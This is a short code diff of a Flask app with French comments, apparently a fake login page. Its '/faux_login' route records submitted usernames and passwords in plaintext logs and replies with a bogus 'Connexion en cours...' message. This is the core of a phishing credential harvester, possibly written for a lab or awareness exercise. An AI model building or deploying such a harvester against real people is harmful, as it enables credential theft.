@@ -1,18 +1,18 @@
-from flask import Flask, request, render_template
+import logging
+from flask import Flask, request
 
 app = Flask(__name__)
 
-@app.route('/', methods=['GET'])
-def home():
-    return render_template("faux_login.html")
+# Configure le logging
+logging.basicConfig(level=logging.INFO)
 
 @app.route('/faux_login', methods=['POST'])
 def login():
     username = request.form.get('username')
     password = request.form.get('password')
 
-    print(f"[+] Nom d'utilisateur reçu : {username}")
-    print(f"[+] Mot de passe reçu : {password}")
+    logging.info(f"[+] Nom d'utilisateur reçu : {username}")
+    logging.info(f"[+] Mot de passe reçu : {password}")
 
     return "<h1>Connexion en cours...</h1>"
 
